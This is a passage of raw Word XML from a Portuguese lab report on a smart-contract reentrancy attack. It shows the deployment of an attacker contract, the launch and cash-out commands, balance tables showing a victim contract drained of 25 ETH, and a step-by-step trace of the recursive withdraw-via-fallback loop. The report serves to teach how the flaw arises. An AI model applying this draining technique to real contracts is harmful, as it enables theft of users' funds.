        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> . </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ReentrancyAttacker.sol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6942B04D"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Compilação bem-sucedida, gerando os arquivos necessários.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E72687E" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="152" w:name="_Toc213881950"/>
      <w:r>
        <w:t>4.3 Deploy do Contrato Atacante</w:t>
      </w:r>
      <w:bookmarkEnd w:id="152"/>
    </w:p>
    <w:p w14:paraId="461F808A"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Editamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>deploy_attack_contract.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> com o endereço do contrato vítima:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41931502"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 xml:space="preserve">victim_addr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70A0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'&lt;ENDEREÇO_DO_CONTRATO_VÍTIMA&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4299D6A0"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color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Executamos o deploy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CB9D5B"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/Labsetup/attacker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deploy_attack_contract.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78606EBE"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O contrato atacante foi implantado com sucesso. Anotamos o endereço retornado para uso na próxima fase.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26856231" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00000000" w:rsidP="00224B0C">
      <w:r>
        <w:pict w14:anchorId="37F76D64">
          <v:rect id="_x0000_i1027" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6614AC51" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="153" w:name="_Toc213881951"/>
      <w:r>
        <w:t>5. Task 3: Execução do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="153"/>
    </w:p>
    <w:p w14:paraId="42239A4F" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="154" w:name="_Toc213881952"/>
      <w:r>
        <w:t>5.1 Preparação do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="154"/>
    </w:p>
    <w:p w14:paraId="6AE39E57"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Editamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>launch_attack.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> com o endereço do contrato atacante:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393E610C"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 xml:space="preserve">attacker_addr </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'&lt;ENDEREÇO_DO_CONTRATO_ATACANTE&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291DE380"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Estado pré-ataque:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Contrato vítima: 25 ETH - Contrato atacante: 0 ETH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAD6CAE" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="155" w:name="_Toc213881953"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>5.2 Execução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="155"/>
    </w:p>
    <w:p w14:paraId="6A2F3E7A"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Lançamos o ataque:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317CC47C"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python3 launch_attack.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8A8DAF"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 transação foi processada e incluída num bloco. O consumo de gas foi significativamente alto devido às múltiplas chamadas recursivas executadas durante o ataque.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506A34BC" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="156" w:name="bookmark=id.xstd5tywg75e" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkStart w:id="157" w:name="_Toc213881954"/>
      <w:bookmarkEnd w:id="156"/>
      <w:r>
        <w:t>5.3 Verificação dos Resultados</w:t>
      </w:r>
      <w:bookmarkEnd w:id="157"/>
    </w:p>
    <w:p w14:paraId="1575F90D"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Verificamos os saldos após o ataque:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E018A6"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python3 get_balance.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551E8998"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Resultados:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="7920" w:type="dxa"/>
        <w:tblInd w:w="-108" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="0020" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
        <w:gridCol w:w="2640"/>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="00224B0C" w14:paraId="47E3B466" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:trPr>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0F917EA3"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Endereço</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BB3F4B3"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Saldo Antes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21BF6DCA"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Saldo Depois</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00224B0C" w14:paraId="19F1BC7E" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="058C9AFA"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Contrato Vítima</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E222E33"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25 ETH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="00536260"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0 ETH</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00224B0C" w14:paraId="7FE05073" w14:textId="77777777" w:rsidTr="00F86E6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69D8E96A"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Contrato Atacante</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="417F8631"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0 ETH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2640" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="544BED6D"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26 ETH</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B7B548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O ataque foi totalmente bem-sucedido! O contrato atacante drenou não apenas os 25 ETH que estavam no contrato, mas também o 1 ETH que ele próprio depositou inicialmente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25665F30" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="158" w:name="_Toc213881955"/>
      <w:r>
        <w:t>5.4 Análise no EtherView</w:t>
      </w:r>
      <w:bookmarkEnd w:id="158"/>
    </w:p>
    <w:p w14:paraId="635E8B5A"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Consultamos o EtherView para analisar a transação:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D14F082" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDN/>
        <w:spacing w:before="36" w:after="36" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A transação mostrava múltiplas chamadas internas (traces)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675B8BE2" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDN/>
        <w:spacing w:before="36" w:after="36" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>O número de iterações recursivas correspondeu ao saldo disponível (26 ETH = 1 depositado + 25 existentes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E124314" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDN/>
        <w:spacing w:before="36" w:after="36" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cada retirada de 1 ETH gerou uma nova chamada recursiva até o contrato ficar sem fundos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA43845" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="159" w:name="_Toc213881956"/>
      <w:r>
        <w:t>5.5 Cash Out</w:t>
      </w:r>
      <w:bookmarkEnd w:id="159"/>
    </w:p>
    <w:p w14:paraId="000F9F63"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Executamos o cash out dos fundos roubados:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72625727"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python3 cashout.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B66A3B"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 transação foi bem-sucedida, transferindo os 26 ETH do contrato atacante para a conta pessoal do atacante.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1632AD" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00000000" w:rsidP="00224B0C">
      <w:r>
        <w:pict w14:anchorId="2A2C60B5">
          <v:rect id="_x0000_i1028" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A2D724" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="160" w:name="_Toc213881957"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>6. Análise Técnica do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="160"/>
    </w:p>
    <w:p w14:paraId="76242DB5" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="161" w:name="_Toc213881958"/>
      <w:r>
        <w:t>6.1 Sequência de Execução Observada</w:t>
      </w:r>
      <w:bookmarkEnd w:id="161"/>
    </w:p>
    <w:p w14:paraId="64FA6A58"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Através dos logs da blockchain e análise do gas usado, reconstruímos a sequência de eventos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CE99E4"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Iteração 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F2BD90"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1. attack() é chamada com 1 ETH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2. victim.deposit(1 ETH) → saldo interno do atacante = 1 ETH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3. victim.withdraw(1 ETH) é chamada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   a. require(balances[attacker] &gt;= 1) → PASSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   b. attacker.call{value: 1 ether} → transfere 1 ETH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   c. fallback() é acionada no contrato atacante</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   d. fallback() verifica: victim.balance &gt;= 1 ETH → VERDADEIRO (ainda tem 25 ETH)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   e. fallback() chama victim.withdraw(1 ETH) novamente</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285EE8FF"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Iterações 2-25:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1D5481"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O mesmo ciclo se repete. Em cada iteração:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>- A verificação de saldo PASSA porque balances[attacker] nunca foi decrementado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>- 1 ETH é enviado ao atacante</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>- fallback() é acionada e chama withdraw() novamente</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3FB8D8"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Iteração 26:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A32A75"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1. victim.withdraw(1 ETH) é chamada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2. require(balances[attacker] &gt;= 1) → PASSA (ainda registra 1 ETH)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3. attacker.call{value: 1 ether} → transfere o último 1 ETH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>4. fallback() é acionada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>5. fallback() verifica: victim.balance &gt;= 1 ETH → FALSO (saldo = 0)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>6. fallback() NÃO chama withdraw() novamente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>7. Retorna ao withdraw() original</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>8. balances[attacker] -= 1 → finalmente atualiza para 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A0AB3D" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="162" w:name="_Toc213881959"/>
      <w:r>
        <w:t>6.2 Por Que a Vulnerabilidade Existe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="162"/>
    </w:p>
    <w:p w14:paraId="7FD609BD"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Identificamos três fatores críticos:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51409BE8" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDN/>
        <w:spacing w:before="36" w:after="36" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Ordem de Operações Incorreta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: O contrato atualiza o estado (balances) APÓS a interação externa (call)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AA040D" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDN/>
        <w:spacing w:before="36" w:after="36" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Uso de call()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
